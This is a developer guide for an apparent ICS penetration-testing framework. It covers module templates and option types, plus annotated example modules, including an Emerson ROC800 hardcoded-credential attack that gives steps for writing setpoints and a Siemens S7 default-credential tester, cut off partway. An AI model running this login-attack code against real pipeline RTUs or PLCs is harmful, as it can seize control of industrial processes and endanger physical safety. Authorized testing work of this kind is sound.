# Module Development

This guide covers everything needed to write a new IXF module: the minimal template, exhaustive annotated examples for every module category, file placement rules, option types, check/run patterns, contributor workflow, and common pitfalls.

---

## Table of Contents

1. [Minimal Template](#minimal-template)
2. [File Placement Rules](#file-placement-rules)
3. [\_\_info\_\_ Field-by-Field Guide](#__info__-field-by-field-guide)
4. [All 10 Option Types](#all-10-option-types)
5. [Full Annotated CVE Module Example](#full-annotated-cve-module-example)
6. [Full Annotated Scanner Module Example](#full-annotated-scanner-module-example)
7. [Full Annotated Credentials Module Example](#full-annotated-credentials-module-example)
8. [Full Annotated Assessment / MITRE Module Example](#full-annotated-assessment--mitre-module-example)
9. [Full Annotated Malware TTP Module Example](#full-annotated-malware-ttp-module-example)
10. [check() Implementation — 5 Patterns](#check-implementation---5-patterns)
11. [run() Implementation Guide](#run-implementation-guide)
12. [DestructiveGate.print\_simulation() Reference](#destructivegateprint_simulation-reference)
13. [Adding Vendor-Specific Options](#adding-vendor-specific-options)
14. [Using @mute and @multi Decorators](#using-mute-and-multi-decorators)
15. [Multi-Target Scanning with @multi](#multi-target-scanning-with-multi)
16. [Validation Command and Expected Output](#validation-command-and-expected-output)
17. [PR Submission Workflow](#pr-submission-workflow)
18. [Module Testing Without Nmap / External Tools](#module-testing-without-nmap--external-tools)
19. [Common Mistakes and How to Avoid Them](#common-mistakes-and-how-to-avoid-them)
20. [Module Template Generator Script](#module-template-generator-script)

---

## Minimal Template

Copy this verbatim, then replace every `MODULE_NAME`, `CVE-YYYY-NNNNN`, and placeholder:

```python
"""IXF MODULE_NAME — brief description. simulate=True default."""
# Standard library — always available
import socket

# IXF core imports — all mandatory ones listed here
from industrialxpl.core.exploit import (
    Exploit,          # Base class — every module inherits this
    OptBool,          # Boolean option (True/False)
    OptIP,            # IP address option (validated)
    OptPort,          # Port option (1-65535)
    mute,             # Decorator: suppresses print_* output inside check()
    print_error,      # Red   [!] message
    print_status,     # Blue  [*] message
    print_success,    # Green [+] message
    print_warning,    # Yellow[!] message
    print_info,       # Cyan  [i] message
    DestructiveGate,  # Simulation gate — always call in simulate branch
)


class Exploit(Exploit):              # Class MUST be named Exploit
    __info__ = {
        "name":             "MODULE_NAME",
        "description":      "One-line description of what this module does.",
        "authors":          ("Your Name",),           # tuple of strings
        "references":       ("https://advisory-url.com",),
        "devices":          ("Vendor Product Model",),
        "impact":           "HIGH",    # INFO/READ/LOW/MEDIUM/HIGH/CRITICAL/CATASTROPHIC
        "exploit_type":     "Default Credentials",
        "source_poc":       "https://poc-url.com",    # or "IXF native"
        "cve":              "CVE-YYYY-NNNNN",          # or "N/A"
        "cvss":             "9.8",                    # or "N/A"
        "severity":         "CRITICAL",               # mirrors impact label
        "mitre_techniques": ["T0866"],                # list of technique IDs
        "mitre_tactics":    ["Initial Access"],       # list of tactic names
    }

    # Declare options as class attributes (not inside __init__)
    target      = OptIP("",    "Target device IP")
    port        = OptPort(502, "Protocol port")
    simulate    = OptBool(True,  "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable live exploitation")

    @mute                         # ALWAYS decorate check() with @mute
    def check(self) -> bool:
        """Read-only connectivity probe — no side effects."""
        if not self.target:       # Guard: target must be set
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True           # True  = target reachable / vulnerable
        except Exception:
            return False          # False = not reachable / not vulnerable

    def run(self) -> None:
        """Execute module or print structured simulation."""
        if not self.target:
            print_error("Set 'target' option first.")
            return

        if self.simulate:                            # Always check simulate first
            DestructiveGate.print_simulation(
                description=(
                    "CVE-YYYY-NNNNN Vendor Product\n"
                    "Step 1: Connect to target:port\n"
                    "Step 2: Send exploit payload\n"
                    "Step 3: Achieve exploitation goal"
                ),
                mitre_techniques=["T0866"],          # Must match __info__
            )
            return                                   # Always return after simulation

        # --- Live exploit code below ---
        print_status("[CVE-YYYY] Exploiting {}:{}...".format(self.target, self.port))
        # ... implement exploitation logic here ...
```

---

## File Placement Rules

Place your module file in the correct directory. The path must exactly match the pattern. Create `__init__.py` in every new directory you add.

| Module Type | Directory Pattern | Example File |
|-------------|------------------|-------------|
| CVE exploit — any vendor | `cve/<vendor>/cve_YYYY_NNNNN_<desc>.py` | `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key.py` |
| CVE exploit — Siemens | `cve/siemens/cve_YYYY_NNNNN_<desc>.py` | `cve/siemens/cve_2019_13945_scalance_auth_bypass.py` |
| CVE exploit — Schneider | `cve/schneider/cve_YYYY_NNNNN_<desc>.py` | `cve/schneider/cve_2022_37300_ecostruxure_rce.py` |
| CVE exploit — Rockwell | `cve/rockwell/cve_YYYY_NNNNN_<desc>.py` | `cve/rockwell/cve_2021_27478_logix_hardcoded.py` |
| CVE exploit — Moxa | `cve/moxa/cve_YYYY_NNNNN_<desc>.py` | `cve/moxa/cve_2020_25159_mgmt_auth_bypass.py` |
| CVE exploit — Emerson | `cve/emerson/cve_YYYY_NNNNN_<desc>.py` | `cve/emerson/cve_2022_29965_roc800_hardcoded.py` |
| CVE exploit — GE | `cve/ge/cve_YYYY_NNNNN_<desc>.py` | `cve/ge/cve_2018_10952_cimplicity_rce.py` |
| CVE exploit — Honeywell | `cve/honeywell/cve_YYYY_NNNNN_<desc>.py` | `cve/honeywell/cve_2021_37740_experion_dos.py` |
| CVE exploit — ABB | `cve/abb/cve_YYYY_NNNNN_<desc>.py` | `cve/abb/cve_2019_7232_pb610_hardcoded.py` |
| CVE exploit — other | `cve/<vendor>/cve_YYYY_NNNNN_<desc>.py` | `cve/omron/cve_2022_31206_fins_overflow.py` |
| Protocol abuse — Modbus | `exploits/protocols/modbus/<name>.py` | `exploits/protocols/modbus/modbus_replay_attack.py` |
| Protocol abuse — DNP3 | `exploits/protocols/dnp3/<name>.py` | `exploits/protocols/dnp3/dnp3_unsolicited_flood.py` |
| Protocol abuse — IEC 104 | `exploits/protocols/iec104/<name>.py` | `exploits/protocols/iec104/iec104_startdt_flood.py` |
| Protocol abuse — S7comm | `exploits/protocols/s7comm/<name>.py` | `exploits/protocols/s7comm/s7_cpu_stop.py` |
| Protocol abuse — EtherNet/IP | `exploits/protocols/ethernetip/<name>.py` | `exploits/protocols/ethernetip/enip_list_identity.py` |
| Protocol abuse — BACnet | `exploits/protocols/bacnet/<name>.py` | `exploits/protocols/bacnet/bacnet_who_is_flood.py` |
| Protocol abuse — OPC UA | `exploits/protocols/opcua/<name>.py` | `exploits/protocols/opcua/opcua_anonymous_browse.py` |
| PLC exploit — Siemens | `exploits/plc/siemens/<name>.py` | `exploits/plc/siemens/siprotec4_dos.py` |
| PLC exploit — Rockwell | `exploits/plc/rockwell/<name>.py` | `exploits/plc/rockwell/logix_unauth_read.py` |
| SCADA exploit | `exploits/scada/<vendor>/<name>.py` | `exploits/scada/schneider/citect_scada_odbc_rce.py` |
| HMI exploit | `exploits/hmi/<vendor>/<name>.py` | `exploits/hmi/siemens/wincc_traversal.py` |
| ICS Scanner | `scanners/ics/<protocol>_scan.py` | `scanners/ics/modbus_detect.py` |
| Network Scanner | `scanners/network/<name>.py` | `scanners/network/ot_port_sweep.py` |
| Default credentials | `creds/<vendor>/<protocol>_default_creds.py` | `creds/siemens/ssh_default_creds.py` |
| Default credentials — generic | `creds/generic/<protocol>_default_creds.py` | `creds/generic/web_default_creds.py` |
| Malware TTP | `cve/malware/<name>.py` | `cve/malware/frostygoop_modbus_heating.py` |
| APT TTP | `cve/apt/<name>.py` | `cve/apt/industroyer2_iec104_rtu.py` |
| Assessment — IEC 62443 | `assessment/iec62443/<name>.py` | `assessment/iec62443/zone_conduit_audit.py` |
| Assessment — NIST | `assessment/nist_sp800_82/<name>.py` | `assessment/nist_sp800_82/control_checklist.py` |
| Assessment — MITRE ICS | `assessment/mitre_ics/t<NNNN>_<tactic_name>.py` | `assessment/mitre_ics/t0843_program_upload.py` |
| Assessment — Risk | `assessment/risk/<name>.py` | `assessment/risk/ics_risk_scorer.py` |
| Assessment — IR | `assessment/ir/<name>.py` | `assessment/ir/iacs_ir_playbook.py` |
| Assessment — Protocol | `assessment/protocols/<name>.py` | `assessment/protocols/opcua_security_audit.py` |
| Assessment — Network | `assessment/network/<name>.py` | `assessment/network/ics_firewall_audit.py` |

**Create `__init__.py` in every new directory:**

```bash
# Linux / macOS
touch industrialxpl/modules/cve/myvendor/__init__.py

# Windows PowerShell
New-Item -ItemType File industrialxpl\modules\cve\myvendor\__init__.py
```

**Naming convention:**

- All lowercase, underscores as separators
- CVE modules: `cve_YYYY_NNNNN_<short_description>.py`
- Scanner modules: `<protocol>_<function>.py` (e.g., `modbus_detect.py`, `s7_info_gather.py`)
- Credential modules: `<protocol>_default_creds.py`
- Assessment modules: `t<NNNN>_<technique_name>.py` for MITRE, or descriptive name for compliance

---

## \_\_info\_\_ Field-by-Field Guide

Every module must define `__info__` as a class-level dictionary. All keys are required.

| Key | Type | Valid Values | Description |
|-----|------|-------------|-------------|
| `name` | `str` | Any string | Human-readable module name shown in `show info` and search. Include CVE ID if applicable. |
| `description` | `str` | 1-4 sentences | Full description of the vulnerability and exploitation impact. No abbreviations. |
| `authors` | `tuple[str, ...]` | Tuple of strings | Your handle(s). Format: `"Real Name (handle)"` |
| `references` | `tuple[str, ...]` | URLs | Official advisories (CISA, NVD, vendor), PoC repos. Must be public URLs. |
| `devices` | `tuple[str, ...]` | Strings | Affected device descriptions: `"Vendor Model Series"` |
| `impact` | `str` | See table below | Operational impact level — choose the highest applicable. |
| `exploit_type` | `str` | See table below | Short category label for the attack technique. |
| `source_poc` | `str` | URL or `"IXF native"` | Link to original public PoC, or `"IXF native"` if built from scratch. |
| `cve` | `str` | `"CVE-YYYY-NNNNN"` or `"N/A"` | CVE identifier. Use `"N/A"` for undisclosed or advisory-only findings. |
| `cvss` | `str` | `"0.0"–"10.0"` or `"N/A"` | CVSS v3 base score as string. Use `"N/A"` if no score assigned. |
| `severity` | `str` | See impact table | Mirrors the `impact` field label. Keep them consistent. |
| `mitre_techniques` | `list[str]` | `["T0NNN", ...]` | MITRE ATT&CK for ICS technique IDs. See `ixf mitre-list` for valid values. |
| `mitre_tactics` | `list[str]` | Tactic name strings | Tactic names corresponding to the listed techniques. |

**Impact levels:**

| Level | Definition | Typical Scenario |
|-------|-----------|-----------------|
| `INFO` | Informational only, no exploitation | Port scan, banner grab |
| `READ` | Read-only data access | Unauthenticated tag read, config download |
| `LOW` | Minor disruption or information exposure | Single HMI page enumeration |
| `MEDIUM` | Significant disruption, partial control | Coil write to non-critical output |
| `HIGH` | Process disruption, production impact | PLC stop, alarm suppression |
| `CRITICAL` | Safety system impact, potential physical damage | Safety relay bypass, setpoint modification |
| `CATASTROPHIC` | Physical destruction or loss of life risk | TRITON-style SIS manipulation, MBR wipe + ICS |

**exploit_type values (canonical list):**

```
Hardcoded Credentials        Default Credentials          Authentication Bypass
Remote Code Execution        Denial of Service            Information Disclosure
Buffer Overflow              SQL Injection                Command Injection
Path Traversal               Arbitrary File Read          Arbitrary File Write
Service Detection            Protocol Fuzzing             Replay Attack
Man-in-the-Middle            Firmware Manipulation        PLC Logic Injection
Malware TTP Replica          APT TTP Replica              Safety Bypass
```

**mitre_tactics valid values (MITRE ATT&CK for ICS):**

```
Initial Access               Execution                    Persistence
Privilege Escalation         Evasion                      Discovery
Lateral Movement             Collection                   Command and Control
Inhibit Response Function    Impair Process Control       Impact
```

---

## All 10 Option Types

IXF provides 10 option types as class-level descriptors. Declare them as class attributes, not inside `__init__`.

### OptIP — IP address

```python
from industrialxpl.core.exploit import OptIP

target = OptIP("", "Target device IP address")
# Constructor: OptIP(default: str, description: str)
# Validates: format is a valid IPv4 address
# Truthy: True when non-empty string
# Usage: self.target → "192.168.1.100" or ""
```

### OptPort — TCP/UDP port

```python
from industrialxpl.core.exploit import OptPort

port    = OptPort(502,  "Modbus TCP port (default: 502)")
s7_port = OptPort(102,  "S7comm port (default: 102)")
dnp3    = OptPort(20000, "DNP3 port (default: 20000)")
# Constructor: OptPort(default: int, description: str)
# Validates: 1 ≤ value ≤ 65535
# Usage: self.port → 502 (int)
```

### OptBool — Boolean flag

```python
from industrialxpl.core.exploit import OptBool

simulate    = OptBool(True,  "Simulate mode (no packets sent)")
destructive = OptBool(False, "Enable live exploitation")
verbose     = OptBool(False, "Enable verbose output")
# Constructor: OptBool(default: bool, description: str)
# Accepts: True, False, "true", "false", "yes", "no", "1", "0"
# Usage: self.simulate → True or False
```

### OptString — Arbitrary string

```python
from industrialxpl.core.exploit import OptString

username  = OptString("admin",  "Username to authenticate with")
password  = OptString("",       "Password (empty = try blank)")
interface = OptString("eth0",   "Network interface for raw sockets")
output    = OptString("",       "Output file path (empty = stdout)")
# Constructor: OptString(default: str, description: str)
# Usage: self.username → "admin"
```

### OptInteger — Integer value

```python
from industrialxpl.core.exploit import OptInteger

unit_id  = OptInteger(1,    "Modbus unit ID (1-247)",    min_value=1,   max_value=247)
timeout  = OptInteger(5,    "Connection timeout seconds", min_value=1,   max_value=120)
threads  = OptInteger(10,   "Concurrent threads",         min_value=1,   max_value=256)
retries  = OptInteger(3,    "Number of retry attempts",   min_value=0,   max_value=10)
reg_addr = OptInteger(0,    "Register start address",     min_value=0,   max_value=65535)
reg_count= OptInteger(10,   "Number of registers to read",min_value=1,   max_value=125)
# Constructor: OptInteger(default: int, description: str, min_value=None, max_value=None)
# Usage: self.unit_id → 1 (int)
```

### OptFloat — Floating point value

```python
from industrialxpl.core.exploit import OptFloat

delay   = OptFloat(0.5, "Delay between packets (seconds)", min_value=0.0, max_value=60.0)
timeout = OptFloat(3.0, "Socket timeout (seconds)",        min_value=0.1, max_value=30.0)
# Constructor: OptFloat(default: float, description: str, min_value=None, max_value=None)
# Usage: self.delay → 0.5 (float)
```

### OptCIDR — CIDR network range

```python
from industrialxpl.core.exploit import OptCIDR

network = OptCIDR("192.168.1.0/24", "Target network CIDR range")
subnet  = OptCIDR("10.0.0.0/8",     "OT network range")
# Constructor: OptCIDR(default: str, description: str)
# Validates: valid CIDR notation
# Usage: self.network → "192.168.1.0/24"
# Iterate: import ipaddress; list(ipaddress.ip_network(self.network).hosts())
```

### OptList — Comma-separated list

```python
from industrialxpl.core.exploit import OptList

ports     = OptList("80,443,8080", "Ports to scan (comma-separated)")
protocols = OptList("modbus,s7,dnp3", "Protocols to probe")
# Constructor: OptList(default: str, description: str)
# Usage: self.ports → ["80", "443", "8080"] (list of strings)
```

### OptFile — File path

```python
from industrialxpl.core.exploit import OptFile

wordlist = OptFile("", "Path to password wordlist file")
targets  = OptFile("", "Path to targets file (one IP per line)")
# Constructor: OptFile(default: str, description: str)
# Validates: file exists when set (warns if not found)
# Usage: self.wordlist → "/path/to/file" (str)
# Read: Path(self.wordlist).read_text().splitlines()
```

### OptChoice — Enumerated choices

```python
from industrialxpl.core.exploit import OptChoice

protocol = OptChoice("tcp",  ["tcp", "udp", "raw"],          "Transport protocol")
mode     = OptChoice("read", ["read", "write", "broadcast"],  "Modbus operation mode")
fc       = OptChoice("04",   ["01", "02", "03", "04", "0F", "10"], "Modbus function code")
# Constructor: OptChoice(default: str, choices: list[str], description: str)
# Validates: value must be in choices list
# Usage: self.protocol → "tcp"
```

---

## Full Annotated CVE Module Example

This example is exhaustively commented. Every design decision is explained.

```python
"""IXF CVE-2022-29965 — Emerson ROC800 RTU Hardcoded Credentials.

Module docstring: one-liner sentence + blank line + CVSS/CWE + affected + description.

CVSS: 9.8 (CRITICAL) | CWE: CWE-798 (Use of Hard-coded Credentials)
Affected: Emerson ROC800 Series RTU — all firmware versions
Fix: No vendor patch as of advisory. Network isolation required.

Emerson ROC800 Series RTUs contain hardcoded credentials that allow full ROC+
protocol access to pipeline measurement systems. Used in oil & gas pipelines,
the device can be read or written without any authorization.

simulate=True by default. Requires written authorization to run live.
"""

# --- Standard library imports --- always try stdlib first before adding deps
import socket
import struct

# --- IXF core imports --- import only what you use
from industrialxpl.core.exploit import (
    Exploit,        # Base class — required
    OptBool,        # simulate and destructive flags
    OptIP,          # validated IP input
    OptPort,        # validated port input
    OptString,      # string options (username, password overrides)
    OptInteger,     # integer options (timeout)
    mute,           # suppress output inside check()
    print_error,    # [!] fatal error messages
    print_info,     # [i] informational messages
    print_status,   # [*] status/progress messages
    print_success,  # [+] findings and successful hits
    print_warning,  # [!] non-fatal warnings
    print_table,    # tabular output — (headers, rows, title)
    DestructiveGate,# simulation gate — always call in simulate branch
)


class Exploit(Exploit):
    # Class MUST be named Exploit — the loader searches for this exact name.
    # __info__ MUST be a class-level dictionary (not an instance attribute).

    __info__ = {
        # name: shown in `show info`, `search`, and report output.
        # Include CVE ID and vendor+product for easy grepping.
        "name": "CVE-2022-29965 Emerson ROC800 RTU Hardcoded Credentials",

        # description: 2-4 sentences. What the vuln is, what you can do, impact scope.
        # Use a tuple of strings for multi-sentence (Python concatenates automatically).
        "description": (
            "Emerson ROC800 Series RTUs used in oil & gas pipeline measurement "
            "contain hardcoded ROC+ protocol credentials. Any device on the same "
            "network can authenticate without authorization and read or write all "
            "RTU configuration, measurement data, and process setpoints. "
            "The vulnerability affects all firmware versions; no patch is available."
        ),

        # authors: tuple of strings. Always include your handle.
        # Multiple contributors: ("Name One (handle1)", "Name Two (handle2)")
        "authors": ("Andre Henrique (mrhenrike)",),

        # references: tuple of public URLs. Prefer CISA, NVD, vendor advisories.
        # Never reference private or unreleased material.
        "references": (
            "https://www.cisa.gov/uscert/ics/advisories/icsa-22-200-03",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-29965",
            "https://www.emerson.com/en-us/automation/roc800",
        ),

        # devices: tuple of strings. One entry per affected device family.
        "devices": (
            "Emerson ROC800 Series RTU",
            "Emerson ROC800L Series RTU",
        ),

        # impact: choose the HIGHEST applicable level.
        # ROC800 controls pipeline flow — CRITICAL is correct.
        "impact": "CRITICAL",

        # exploit_type: a short category label (see canonical list in __info__ guide).
        "exploit_type": "Hardcoded Credentials",

        # source_poc: link to original public PoC or "IXF native".
        "source_poc": "https://www.cisa.gov/uscert/ics/advisories/icsa-22-200-03",

        # cve: use exact CVE format with 5-digit NNNNN padding.
        "cve": "CVE-2022-29965",

        # cvss: CVSS v3 base score as string. CWE-798 network-exploitable = 9.8
        "cvss": "9.8",

        # severity: must match the impact label (not a different word).
        "severity": "CRITICAL",

        # mitre_techniques: list of ICS ATT&CK technique IDs.
        # T0859 = Valid Accounts, T0813 = Denial of Control
        "mitre_techniques": ["T0859", "T0813"],

        # mitre_tactics: tactic names matching the listed techniques.
        "mitre_tactics": ["Credential Access", "Impair Process Control"],
    }

    # --- Class-level option descriptors ---
    # Declare as class attributes. Do not use self.options["key"] — access via self.key.

    target = OptIP(
        "",                              # Default: empty (unset)
        "Target Emerson ROC800 RTU IP",  # Shown in `show options`
    )
    port = OptPort(
        4000,                            # ROC+ default port
        "ROC+ protocol port (default: 4000)",
    )
    timeout = OptInteger(
        5,                               # 5 second timeout
        "Socket connection timeout in seconds",
        min_value=1,
        max_value=60,
    )
    simulate = OptBool(
        True,                            # ALWAYS default True — this is mandatory
        "Simulate mode — no live traffic (default: True)",
    )
    destructive = OptBool(
        False,                           # ALWAYS default False
        "Enable live exploitation — requires written authorization",
    )

    # Module-level constant: hardcoded credentials from the public advisory.
    # Storing as a class constant (not a string in run()) makes it easy to extend.
    ROC_DEFAULT_CREDS = [
        ("admin",    "ROC800"),    # Primary admin account
        ("operator", "op"),        # Operator account
        ("",         ""),          # Blank/anonymous (some firmware versions)
    ]

    @mute  # @mute suppresses all print_* calls inside this method.
    # This is MANDATORY for check() — it must be silent when called from `autocheck`.
    def check(self) -> bool:
        """Read-only connectivity probe — TCP connect only, no data sent.

        Returns True if the target is reachable on the ROC+ port.
        check() must NEVER send exploit payloads or modify device state.
        """
        if not self.target:       # Guard: empty target → always False
            return False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            s.close()
            # True = port is open. Does not mean it's a ROC800, but allows check()
            # to return a definitive answer without sending protocol frames.
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            # These are expected when the target is offline or port is closed.
            return False
        except Exception:
            # Catch-all: unexpected errors should not crash the framework.
            return False

    def run(self) -> None:
        """Test hardcoded credentials against target ROC800 or print simulation.

        run() is the main entry point called by `run` in the interactive shell
        or by `ixf use ... run` in non-interactive mode.
        """
        # Guard: target must be set before running.
        if not self.target:
            print_error("Set 'target' option first.  Example: set target 192.168.1.100")
            return

        # Simulate branch: ALWAYS the first check in run().
        # DestructiveGate.print_simulation() prints the structured simulation block.
        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2022-29965 Emerson ROC800 Hardcoded Credentials\n\n"
                    "Step 1: Connect to ROC800 on {}:{} (ROC+ protocol)\n"
                    "Step 2: Build ROC+ authentication frame with hardcoded creds\n"
                    "        Frame: [0x10][0x01][username:16B][password:16B]\n"
                    "Step 3: Send frame and receive 8-byte auth response\n"
                    "Step 4: Check response[2] == 0x00 for authentication success\n"
                    "Step 5: If authenticated, read all I/O parameters and setpoints\n"
                    "Step 6: Optionally write process setpoints (pipeline flow control)\n"
                    "        or exfiltrate all measurement data\n"
                    "\n"
                    "Credentials tested:\n"
                    "  admin / ROC800\n"
                    "  operator / op\n"
                    "  (empty) / (empty)\n"
                    "\n"
                    "Targets: Oil & gas pipeline measurement RTUs\n"
                    "Impact:  Full RTU control, measurement data theft"
                ).format(self.target, self.port),
                mitre_techniques=["T0859", "T0813"],  # must match __info__
            )
            # Additional informational messages after simulation block
            print_info("Advisory: https://www.cisa.gov/uscert/ics/advisories/icsa-22-200-03")
            print_info("Hardcoded creds: admin/ROC800 | operator/op | empty/empty")
            return  # ALWAYS return after simulation — do not fall through to live code

        # --- Live exploit code (runs only when simulate=False) ---
        print_status("[CVE-2022-29965] Testing {} credential set(s) against {}:{}".format(
            len(self.ROC_DEFAULT_CREDS), self.target, self.port))

        results = []  # Collect results for tabular output

        for username, password in self.ROC_DEFAULT_CREDS:
            try:
                # Each credential attempt gets a fresh connection
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((self.target, self.port))

                # ROC+ authentication frame — simplified from public protocol docs.
                # Format: [opcode:1B][subcode:1B][username:16B][password:16B]
                auth_frame = struct.pack(
                    ">BB16s16s",
                    0x10,                                    # ROC+ opcode: auth request
                    0x01,                                    # Subcode: login
                    username.encode().ljust(16, b'\x00'),    # Pad to 16 bytes
                    password.encode().ljust(16, b'\x00'),    # Pad to 16 bytes
                )
                s.send(auth_frame)

                # Read 8-byte response header
                response = s.recv(8)
                s.close()

                # Response byte 2 == 0x00 indicates authentication success
                if response and len(response) >= 3 and response[2] == 0x00:
                    display_user = username if username else "(empty)"
                    display_pass = password if password else "(empty)"
                    results.append((display_user, display_pass, "SUCCESS"))
                    print_success("[+] Valid: '{}' / '{}'".format(display_user, display_pass))
                else:
                    display_user = username if username else "(empty)"
                    display_pass = password if password else "(empty)"
                    results.append((display_user, display_pass, "FAILED"))

            except socket.timeout:
                results.append((username or "(empty)", password or "(empty)", "TIMEOUT"))
            except ConnectionRefusedError:
                print_error("Connection refused — target not reachable on port {}".format(self.port))
                break  # No point continuing if the port is closed
            except Exception as e:
                results.append((
                    username or "(empty)",
                    password or "(empty)",
                    "ERROR: {}".format(str(e)[:30]),
                ))

        # Print results table if any attempts were made
        if results:
            print_table(
                ["Username", "Password", "Result"],  # Column headers
                results,                               # List of (col1, col2, col3) tuples
                title="ROC800 Credential Test — {}:{}".format(self.target, self.port),
            )

        # Summary
        successes = [r for r in results if r[2] == "SUCCESS"]
        if successes:
            print_success("[CVE-2022-29965] {} valid credential(s) found.".format(len(successes)))
        else:
            print_info("[CVE-2022-29965] No valid credentials found on {}:{}".format(
                self.target, self.port))
```

---

## Full Annotated Scanner Module Example

```python
"""IXF Modbus TCP Device Scanner — detect and fingerprint Modbus TCP devices.

Sends a Modbus FC04 (Read Input Registers) probe and validates the Transaction
ID echo in the response. Optionally reads device identification via FC43/MEI.

simulate=True by default.
"""
import socket
import struct
from typing import Optional

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptInteger, OptChoice, mute,
    print_error, print_status, print_success, print_info, print_table,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "Modbus TCP Device Scanner",
        "description": (
            "Detect Modbus TCP devices using a passive FC04 probe and validate the "
            "Transaction ID echo in the response. Optionally requests device "
            "identification via FC43/MEI (Read Device Identification, Object 0x01-0x03)."
        ),
        "authors":          ("Andre Henrique (mrhenrike)",),
        "references":       ("https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf",),
        "devices":          ("Any Modbus TCP device",),
        "impact":           "LOW",
        "exploit_type":     "Service Detection",
        "source_poc":       "IXF native implementation",
        "cve":              "N/A",
        "cvss":             "N/A",
        "severity":         "INFO",
        "mitre_techniques": ["T0888", "T0802"],
        "mitre_tactics":    ["Discovery"],
    }

    target   = OptIP("",    "Target IP address")
    port     = OptPort(502,  "Modbus TCP port (default: 502)")
    unit_id  = OptInteger(1, "Modbus unit ID (1-247)", min_value=1, max_value=247)
    timeout  = OptInteger(5, "Connection timeout in seconds", min_value=1, max_value=60)
    identify = OptBool(False, "Send FC43/MEI device identification request")
    simulate = OptBool(True,  "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable active probing")

    # FC04 probe: Transaction=1, Protocol=0, Length=6, UnitID=1, FC=04, Addr=0, Count=1
    # struct format ">HHHBBHH": two shorts (Trans ID, Protocol, Length), byte (Unit ID),
    # byte (Function Code), short (Start Address), short (Count)
    _FC04_PROBE = struct.pack(">HHHBBHH", 1, 0, 6, 1, 0x04, 0x0000, 0x0001)

    # FC43 MEI device identification: Trans=2, Proto=0, Len=5, Unit=1, FC=43, MEI=14, ObjId=0x01
    _FC43_PROBE = struct.pack(">HHHBBBBB", 2, 0, 5, 1, 0x2B, 0x0E, 0x01, 0x00)

    @mute
    def check(self) -> bool:
        """Send FC04 probe and validate Transaction ID echo in response."""
        if not self.target:
            return False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            s.send(self._FC04_PROBE)
            resp = s.recv(64)
            s.close()
            # Validate: response has Modbus MBAP header (≥6 bytes) and
            # Transaction ID echo matches what we sent (bytes 0-1 == \x00\x01)
            return len(resp) >= 6 and resp[0:2] == b'\x00\x01'
        except Exception:
            return False

    def _read_device_id(self) -> Optional[dict]:
        """Send FC43/MEI and parse vendor, product, revision strings."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            s.send(self._FC43_PROBE)
            data = s.recv(256)
            s.close()
            # FC43 response: MBAP(6B) + FC(1B) + MEI(1B) + ConformityLevel(1B) + ...
            if len(data) < 9 or data[7] != 0x2B:
                return None
            # Parse object list (simplified: extract first 3 ASCII strings)
            pos = 11  # After MBAP + FC + MEI + ConformityLevel + MoreFollows + ObjCount
            ids = {}
            for obj_id in [0x00, 0x01, 0x02]:
                if pos + 2 > len(data):
                    break
                # obj_id_byte = data[pos]; length = data[pos+1]; value = data[pos+2:pos+2+length]
                length = data[pos + 1]
                value = data[pos + 2:pos + 2 + length].decode("ascii", errors="replace")
                ids[obj_id] = value
                pos += 2 + length
            return ids
        except Exception:
            return None

    def run(self) -> None:
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "Modbus TCP Device Detection\n\n"
                    "Step 1: TCP connect to {}:{}\n"
                    "Step 2: Send FC04 probe (Read Input Registers)\n"
                    "        Payload (hex): {}\n"
                    "Step 3: Validate Transaction ID echo in 6-byte MBAP response\n"
                    "Step 4: If identify=True, send FC43/MEI (Object IDs 0x00-0x02)\n"
                    "        Extract: VendorName, ProductCode, MajorMinorRevision\n"
                    "Impact: Device fingerprinted — vendor, model, firmware revision known"
                ).format(self.target, self.port, self._FC04_PROBE.hex()),
                mitre_techniques=["T0888", "T0802"],
            )
            return

        print_status("[Modbus] Probing {}:{} (Unit ID: {})...".format(
            self.target, self.port, self.unit_id))

        if self.check():
            print_success("[+] Modbus TCP device detected at {}:{}".format(
                self.target, self.port))

            if self.identify:
                dev_id = self._read_device_id()
                if dev_id:
                    rows = [
                        ("VendorName",          dev_id.get(0x00, "N/A")),
                        ("ProductCode",         dev_id.get(0x01, "N/A")),
                        ("MajorMinorRevision",  dev_id.get(0x02, "N/A")),
                    ]
                    print_table(
                        ["Object", "Value"],
                        rows,
                        title="FC43 MEI Device Identification",
                    )
                else:
                    print_info("FC43 MEI not supported or returned no data.")
        else:
            print_info("[-] No Modbus response from {}:{}".format(self.target, self.port))
```

---

## Full Annotated Credentials Module Example

```python
"""IXF Siemens S7 Default Credentials — common default passwords for S7 PLC web/FTP.

Tests default credentials for the Siemens SIMATIC S7-300/400/1200/1500 web server
and FTP interface. These devices often ship with blank or well-known passwords.

simulate=True by default.
"""
import socket
import ftplib
import base64
import urllib.request
from typing import List, Tuple

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptInteger, OptChoice, mute,
    print_error, print_status, print_success, print_info, print_table,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "Siemens S7 Default Credentials — Web / FTP",
        "description": (
            "Tests common default and factory-reset credentials against Siemens "
            "SIMATIC S7 PLC web server (HTTP port 80) and FTP interface (port 21). "
            "Many S7 devices ship with blank passwords or well-known defaults that "
            "are never changed in production environments."
        ),
        "authors":          ("Andre Henrique (mrhenrike)",),
        "references":       (
            "https://support.industry.siemens.com/cs/ww/en/view/109781364",
